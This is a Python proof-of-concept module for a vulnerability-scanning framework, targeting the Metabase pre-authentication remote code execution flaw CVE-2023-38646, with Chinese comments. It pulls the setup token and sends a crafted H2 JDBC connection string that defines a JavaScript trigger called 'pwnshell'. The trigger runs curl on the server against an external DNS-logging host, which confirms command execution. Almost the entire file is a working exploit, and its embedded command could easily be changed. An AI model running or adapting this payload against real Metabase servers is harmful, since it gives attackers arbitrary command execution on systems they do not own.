# coding:utf-8
import json

import requests
from lib.core.common import url_handle, get_random_ua, get_ceye_dns, verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "CVE-2023-38646 Metabase RCE",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Metabase 0.46.6.1之前版本和Metabase Enterprise 1.46.6.1之前版本存在安全漏洞，该漏洞源于允许攻击者以服务器的权限级别在服务器上执行任意命令
        """,  # 漏洞简要描述

        "fofa-dork": """
        
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/api/session/properties"  # url自己按需调整

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if req.status_code == 200 and "application/json" in req.headers["Content-Type"]:
                success, dns_flag = get_ceye_dns()
                if success == False:
                    return [False, dns_flag]

                setup_token = json.loads(req.text)["setup-token"]
                url1 = self.target + "/api/setup/validate"
                headers["Content-Type"] = "application/json"
                data = """

{
    "token": "%s",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('curl metabase.%s')\\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}""" % (setup_token, dns_flag)
                req1 = requests.post(url1, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout,
                                     verify=False)
                flager = verify_ceye_dns(dns_flag)

                if flager:
                    vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
